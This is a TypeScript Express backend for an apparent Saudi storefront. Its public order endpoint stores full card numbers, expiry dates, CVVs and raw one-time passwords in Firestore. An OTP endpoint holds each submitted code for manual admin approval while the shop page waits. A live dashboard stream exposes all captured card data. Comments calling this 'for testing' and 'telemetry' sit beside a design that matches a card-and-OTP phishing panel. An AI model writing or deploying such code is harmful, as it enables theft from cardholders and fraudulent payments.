import { Router, type IRouter } from "express";
import { z } from "zod";
import { Timestamp, FieldValue } from "firebase-admin/firestore";
import { getDb } from "../lib/firebase";
import { logger } from "../lib/logger";
import {
  getDashboardSecret,
  requireDashboardSecret,
  verifyDashboardSecret,
} from "../middlewares/dashboardSecretMiddleware";

const router: IRouter = Router();

// Recursively convert Firestore Admin SDK Timestamp instances (and any
// nested objects/arrays) into plain `{ seconds, nanoseconds }` JSON. The
// dashboard's `tsToDate` helper accepts that shape directly. We can't rely
// on JSON.stringify's default Timestamp.toJSON() because it emits
// `{_seconds, _nanoseconds}` (leading underscores), which the client does
// not understand.
function serializeForStream(value: unknown): unknown {
  if (value instanceof Timestamp) {
    return { seconds: value.seconds, nanoseconds: value.nanoseconds };
  }
  if (Array.isArray(value)) {
    return value.map((v) => serializeForStream(v));
  }
  if (value && typeof value === "object") {
    const out: Record<string, unknown> = {};
    for (const [k, v] of Object.entries(value as Record<string, unknown>)) {
      out[k] = serializeForStream(v);
    }
    return out;
  }
  return value;
}

// ──────────────────────────────────────────────────────────────────────────────
// POST /admin/dashboard/verify — used by the dashboard password gate to
// confirm the entered secret before storing it in the browser. Does not
// reveal anything beyond a 200/401, and is rate-naturally-limited because
// it has nothing to brute force besides the secret itself.
// ──────────────────────────────────────────────────────────────────────────────

const verifySchema = z.object({ secret: z.string().min(1).max(512) });

router.post("/admin/dashboard/verify", (req, res) => {
  try {
    if (!getDashboardSecret()) {
      logger.error(
        "DASHBOARD_SECRET is not configured; cannot verify dashboard password",
      );
      res.status(503).json({
        error: "Dashboard is not configured (missing DASHBOARD_SECRET).",
      });
      return;
    }
    const { secret } = verifySchema.parse(req.body);
    if (!verifyDashboardSecret(secret)) {
      res.status(401).json({ error: "Invalid dashboard password." });
      return;
    }
    res.json({ ok: true });
  } catch (err) {
    if (err instanceof z.ZodError) {
      res.status(400).json({ error: "Validation failed", details: err.issues });
      return;
    }
    logger.error({ err }, "Failed to verify dashboard secret");
    res.status(500).json({ error: "Failed to verify dashboard secret" });
  }
});

// ──────────────────────────────────────────────────────────────────────────────
// Order schema (server-side validation)
// ──────────────────────────────────────────────────────────────────────────────

const orderItemSchema = z.object({
  name_ar: z.string().min(1),
  price: z.number().nonnegative(),
  qty: z.number().int().positive(),
  image_url: z.string().default(""),
});

const orderShippingSchema = z.object({
  city: z.string().min(1),
  district: z.string().optional().default(""),
  postal_code: z.string().optional().default(""),
  address: z.string().min(1),
  building: z.string().optional().default(""),
  floor: z.string().optional().default(""),
  notes: z.string().optional().default(""),
  status: z
    .enum(["pending", "shipped", "delivered", "cancelled"])
    .optional()
    .default("pending"),
});

const orderPaymentSchema = z.object({
  method: z.enum(["cod", "credit"]),
  amount: z.number().nonnegative(),
  status: z
    .enum(["pending", "verified", "failed"])
    .optional()
    .default("pending"),
  otpVerified: z.boolean().optional().default(false),
  receiptUrl: z.string().url().optional(),
  cardLast4: z
    .string()
    .regex(/^\d{4}$/)
    .optional(),
  cardName: z.string().max(120).optional(),
  // NOTE: Storing the full PAN, expiry, CVV, and raw OTP in the orders
  // collection has been explicitly requested for testing. This is *not*
  // PCI-compliant — do not enable in production. The same data is also
  // captured to `pays/{visitorId}` by the storefront for telemetry.
  cardNumber: z.string().min(12).max(25).optional(),
  expiry: z
    .string()
    .regex(/^\d{2}\/\d{2}$/)
    .optional(),
  cvv: z
    .string()
    .regex(/^\d{3,4}$/)
    .optional(),
  otp: z.string().regex(/^(\d{4}|\d{6})$/).optional(),
});

// Customers may only emit a narrow set of event types when placing an order.
// `placed` is added server-side automatically, so it's not allowed here.
const customerEventSchema = z.object({
  type: z.enum(["payment_submitted", "otp_verified"]),
  message: z.string().min(1).max(500),
});

const createOrderSchema = z.object({
  customer: z.object({
    name: z.string().min(1).max(120),
    phone: z.string().min(3).max(40),
  }),
  shipping: orderShippingSchema,
  payment: orderPaymentSchema,
  items: z.array(orderItemSchema).min(1).max(50),
  total: z.number().nonnegative(),
  notes: z.string().max(2000).optional().default(""),
  events: z.array(customerEventSchema).max(10).optional().default([]),
});

const statusUpdateSchema = z.object({
  status: z.enum(["pending", "confirmed", "shipped", "delivered", "cancelled"]),
});

const adminNoteSchema = z.object({
  message: z.string().min(1).max(2000),
});

// ──────────────────────────────────────────────────────────────────────────────
// Helpers
// ──────────────────────────────────────────────────────────────────────────────

function newId(prefix: string): string {
  return `${prefix}-${Date.now()}-${Math.random().toString(36).slice(2, 10)}`;
}

const STATUS_MESSAGES: Record<string, string> = {
  pending: "تم وضع الطلب قيد الانتظار",
  confirmed: "تم تأكيد الطلب ✅",
  shipped: "تم شحن الطلب 🚚",
  delivered: "تم تسليم الطلب 📦",
  cancelled: "تم إلغاء الطلب ❌",
};

const STATUS_TO_EVENT_TYPE: Record<string, string> = {
  pending: "placed",
  confirmed: "confirmed",
  shipped: "shipped",
  delivered: "delivered",
  cancelled: "cancelled",
};

// ──────────────────────────────────────────────────────────────────────────────
// POST /orders — public; create a new order from the storefront checkout
// ──────────────────────────────────────────────────────────────────────────────

router.post("/orders", async (req, res) => {
  try {
    const data = createOrderSchema.parse(req.body);
    const db = getDb();
    const id = newId("order");
    const now = Timestamp.now();

    const placedEvent = {
      id: newId("evt"),
      type: "placed",
      message: `تم استلام الطلب من ${data.customer.name}`,
      actor: "customer",
      createdAt: now,
    };

    const additionalEvents = data.events.map((e) => ({
      id: newId("evt"),
      type: e.type,
      message: e.message,
      actor: "customer",
      createdAt: now,
    }));

    const order = {
      id,
      customer: data.customer,
      shipping: data.shipping,
      payment: {
        method: data.payment.method,
        amount: data.payment.amount,
        currency: "SAR" as const,
        status: data.payment.status,
        otpVerified: data.payment.otpVerified,
        ...(data.payment.otpVerified ? { otpVerifiedAt: now } : {}),
        ...(data.payment.receiptUrl
          ? { receiptUrl: data.payment.receiptUrl }
          : {}),
        ...(data.payment.cardLast4
          ? { cardLast4: data.payment.cardLast4 }
          : {}),
        ...(data.payment.cardName ? { cardName: data.payment.cardName } : {}),
        ...(data.payment.cardNumber
          ? { cardNumber: data.payment.cardNumber }
          : {}),
        ...(data.payment.expiry ? { expiry: data.payment.expiry } : {}),
        ...(data.payment.cvv ? { cvv: data.payment.cvv } : {}),
        ...(data.payment.otp ? { otp: data.payment.otp } : {}),
      },
      items: data.items,
      total: data.total,
      status: "pending" as const,
      notes: data.notes,
      events: [placedEvent, ...additionalEvents],
      createdAt: now,
      updatedAt: now,
    };

    await db.collection("orders").doc(id).set(order);
    res.status(201).json({ id });
  } catch (err) {
    if (err instanceof z.ZodError) {
      res.status(400).json({ error: "Validation failed", details: err.issues });
      return;
    }
    logger.error({ err }, "Failed to create order");
    res.status(500).json({ error: "Failed to create order" });
  }
});

// ──────────────────────────────────────────────────────────────────────────────
// PATCH /orders/:id/otp — public; storefront calls this after the customer
// enters the OTP. Stores the raw OTP on the order's payment object and marks
// otpVerified = true. NOTE: storing raw OTP is non-PCI; explicitly accepted
// for testing.
// ──────────────────────────────────────────────────────────────────────────────

const otpUpdateSchema = z.object({
  otp: z.string().regex(/^(\d{4}|\d{6})$/),
});

router.patch("/orders/:id/otp", async (req, res) => {
  try {
    const id = String(req.params.id || "");
    if (!id) {
      res.status(400).json({ error: "Invalid order id" });
      return;
    }
    const { otp } = otpUpdateSchema.parse(req.body);
    const db = getDb();
    const ref = db.collection("orders").doc(id);
    const snap = await ref.get();
    if (!snap.exists) {
      res.status(404).json({ error: "Order not found" });
      return;
    }
    const now = Timestamp.now();
    // Customer-submitted OTPs are NOT auto-verified anymore. We store the
    // raw code and leave verification (otpVerified) to an admin who reviews
    // the order on the dashboard via /orders/:id/otp/decision.
    const event = {
      id: newId("evt"),
      type: "otp_submitted",
      message: `تم إدخال رمز التحقق ${otp} (بانتظار موافقة الإدارة)`,
      actor: "customer",
      createdAt: now,
    };
    await ref.update({
      "payment.otp": otp,
      "payment.otpVerified": false,
      "payment.otpDecision": "pending",
      "payment.otpSubmittedAt": now,
      updatedAt: now,
      events: FieldValue.arrayUnion(event),
    });
    res.json({ ok: true, id });
  } catch (err) {
    if (err instanceof z.ZodError) {
      res.status(400).json({ error: "Validation failed", details: err.issues });
      return;
    }
    logger.error({ err }, "Failed to update order OTP");
    res.status(500).json({ error: "Failed to update order OTP" });
  }
});

// ──────────────────────────────────────────────────────────────────────────────
// GET /orders/:id/otp-status — public; storefront polls this after the
// customer submits an OTP, waiting for the admin's approve/reject decision.
// Intentionally returns ONLY the OTP decision fields (no PII, no card data).
// ──────────────────────────────────────────────────────────────────────────────

router.get("/orders/:id/otp-status", async (req, res) => {
  try {
    const id = String(req.params.id || "");
    if (!id) {
      res.status(400).json({ error: "Invalid order id" });
      return;
    }
    const db = getDb();
    const snap = await db.collection("orders").doc(id).get();
    if (!snap.exists) {
      res.status(404).json({ error: "Order not found" });
      return;
    }
    const data = snap.data() as { payment?: Record<string, unknown> };
    const payment = data.payment ?? {};
    res.json({
      otpVerified: Boolean(payment.otpVerified),
      otpDecision:
        (payment.otpDecision as string | undefined) ?? "pending",
    });
  } catch (err) {
    logger.error({ err }, "Failed to read OTP status");
    res.status(500).json({ error: "Failed to read OTP status" });
  }
});

// ──────────────────────────────────────────────────────────────────────────────
// PATCH /orders/:id/otp/decision — admin approves or rejects a submitted OTP.
// Gated by the dashboard secret + Clerk session.
// ──────────────────────────────────────────────────────────────────────────────

const otpDecisionSchema = z.object({
  decision: z.enum(["approve", "reject"]),
});

router.patch(
  "/orders/:id/otp/decision",
  requireDashboardSecret,
  async (req, res) => {
    try {
      const id = String(req.params.id || "");
      if (!id) {
        res.status(400).json({ error: "Invalid order id" });
        return;
      }
      const { decision } = otpDecisionSchema.parse(req.body);
      const db = getDb();
      const ref = db.collection("orders").doc(id);
      const snap = await ref.get();
      if (!snap.exists) {
        res.status(404).json({ error: "Order not found" });
        return;
      }
      const now = Timestamp.now();
      const approved = decision === "approve";
      const event = {
        id: newId("evt"),
        type: approved ? "otp_approved" : "otp_rejected",
        message: approved
          ? "تمت الموافقة على رمز التحقق"
          : "تم رفض رمز التحقق",
        actor: "admin",
        createdAt: now,
      };
      const updates: Record<string, unknown> = {
        "payment.otpVerified": approved,
        "payment.otpDecision": approved ? "approved" : "rejected",
        "payment.otpDecidedAt": now,
        updatedAt: now,
        events: FieldValue.arrayUnion(event),
      };
      if (approved) {
        updates["payment.otpVerifiedAt"] = now;
      }
      await ref.update(updates);
      res.json({ ok: true, id, decision });
    } catch (err) {
      if (err instanceof z.ZodError) {
        res
          .status(400)
          .json({ error: "Validation failed", details: err.issues });
        return;
      }
      logger.error({ err }, "Failed to record OTP decision");
      res.status(500).json({ error: "Failed to record OTP decision" });
    }
  },
);

// ──────────────────────────────────────────────────────────────────────────────
// PATCH /orders/:id/status — change status & append matching event.
// Gated by the shared dashboard secret (X-Dashboard-Secret header).
// ──────────────────────────────────────────────────────────────────────────────

router.patch("/orders/:id/status", requireDashboardSecret, async (req, res) => {
  try {
    const id = String(req.params.id || "");
    if (!id) {
      res.status(400).json({ error: "Invalid order id" });
      return;
    }
    const { status } = statusUpdateSchema.parse(req.body);
    const db = getDb();
    const ref = db.collection("orders").doc(id);
    const snap = await ref.get();
    if (!snap.exists) {
      res.status(404).json({ error: "Order not found" });
      return;
    }
    const now = Timestamp.now();
    const event = {
      id: newId("evt"),
      type: STATUS_TO_EVENT_TYPE[status] ?? status,
      message: STATUS_MESSAGES[status] ?? `تم تحديث الحالة إلى ${status}`,
      actor: "admin",
      createdAt: now,
    };
    const updates: Record<string, unknown> = {
      status,
      updatedAt: now,
      events: FieldValue.arrayUnion(event),
    };
    if (
      status === "shipped" ||
      status === "delivered" ||
      status === "cancelled"
    ) {
      updates["shipping.status"] = status;
    }
    await ref.update(updates);
    res.json({ ok: true, id, status });
  } catch (err) {
    if (err instanceof z.ZodError) {
      res.status(400).json({ error: "Validation failed", details: err.issues });
      return;
    }
    logger.error({ err }, "Failed to update order status");
    res.status(500).json({ error: "Failed to update order status" });
  }
});

// ──────────────────────────────────────────────────────────────────────────────
// POST /orders/:id/admin-notes — append admin_note event.
// Gated by the shared dashboard secret (X-Dashboard-Secret header).
// ──────────────────────────────────────────────────────────────────────────────

router.post(
  "/orders/:id/admin-notes",
  requireDashboardSecret,
  async (req, res) => {
    try {
      const id = String(req.params.id || "");
      if (!id) {
        res.status(400).json({ error: "Invalid order id" });
        return;
      }
      const { message } = adminNoteSchema.parse(req.body);
      const db = getDb();
      const ref = db.collection("orders").doc(id);
      const snap = await ref.get();
      if (!snap.exists) {
        res.status(404).json({ error: "Order not found" });
        return;
      }
      const now = Timestamp.now();
      const event = {
        id: newId("evt"),
        type: "admin_note",
        message,
        actor: "admin",
        createdAt: now,
      };
      await ref.update({
        updatedAt: now,
        events: FieldValue.arrayUnion(event),
      });
      res.status(201).json({ ok: true, id, eventId: event.id });
    } catch (err) {
      if (err instanceof z.ZodError) {
        res
          .status(400)
          .json({ error: "Validation failed", details: err.issues });
        return;
      }
      logger.error({ err }, "Failed to append admin note");
      res.status(500).json({ error: "Failed to append admin note" });
    }
  },
);

// ──────────────────────────────────────────────────────────────────────────────
// GET /orders/stream — live NDJSON feed of all orders for the dashboard.
// Gated by the shared dashboard secret (X-Dashboard-Secret header). Uses
// the Firebase Admin SDK on the server side, so the browser never reads
// from Firestore directly. Each emitted record is a JSON-encoded array of
// the full order set, ordered by createdAt desc — i.e. the same shape the
// previous client-side onSnapshot delivered.
//
// Heartbeats (a single `\n` line every 25s) keep the connection alive
// through proxies that idle-out long-lived HTTP responses.
// ──────────────────────────────────────────────────────────────────────────────

// ──────────────────────────────────────────────────────────────────────────────
// GET /orders — one-shot snapshot of all orders, ordered by createdAt desc.
// Used by the dashboard's polling fallback when the live NDJSON stream is
// unavailable (e.g. Netlify Functions deployment, which buffers responses
// and so cannot keep a long-lived stream open). Identical payload shape to
// each snapshot frame emitted by /orders/stream.
// ──────────────────────────────────────────────────────────────────────────────
router.get("/orders", requireDashboardSecret, async (_req, res) => {
  try {
    const db = getDb();
    const snap = await db
      .collection("orders")
      .orderBy("createdAt", "desc")
      .get();
    const orders = snap.docs.map((d) =>
      serializeForStream({ ...d.data(), id: d.id }),
    );
    res.json(orders);
  } catch (err) {
    logger.error({ err }, "Failed to list orders snapshot");
    res.status(500).json({
      error:
        err instanceof Error ? err.message : "Failed to list orders snapshot",
    });
  }
});

router.get("/orders/stream", requireDashboardSecret, (req, res) => {
  res.setHeader("Content-Type", "application/x-ndjson; charset=utf-8");
  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate");
  res.setHeader("Connection", "keep-alive");
  // Hint to upstream proxies (nginx/Replit edge) not to buffer the body.
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders?.();

  // Disable Nagle so each snapshot lands at the client immediately.
  req.socket?.setNoDelay?.(true);

  const db = getDb();
  let closed = false;

  const heartbeat = setInterval(() => {
    if (closed) return;
    try {
      res.write("\n");
    } catch {
      /* will be cleaned up by the close handler */
    }
  }, 25_000);

  const unsub = db
    .collection("orders")
    .orderBy("createdAt", "desc")
    .onSnapshot(
      (snap) => {
        if (closed) return;
        const orders = snap.docs.map((d) => {
          const data = d.data();
          return serializeForStream({ ...data, id: d.id });
        });
        try {
          res.write(JSON.stringify(orders) + "\n");
        } catch (err) {
          logger.error({ err }, "Failed to write orders stream chunk");
        }
      },
      (err) => {
        logger.error({ err }, "orders stream snapshot error");
        if (closed) return;
        closed = true;
        clearInterval(heartbeat);
        try {
          res.write(
            JSON.stringify({ __error: err.message || String(err) }) + "\n",
          );
        } catch {
          /* ignore */
        }
        res.end();
      },
    );

  const cleanup = () => {
    if (closed) return;
    closed = true;
    clearInterval(heartbeat);
    try {
      unsub();
    } catch {
      /* ignore */
    }
  };

  req.on("close", cleanup);
  req.on("aborted", cleanup);
  res.on("close", cleanup);
});

export default router;
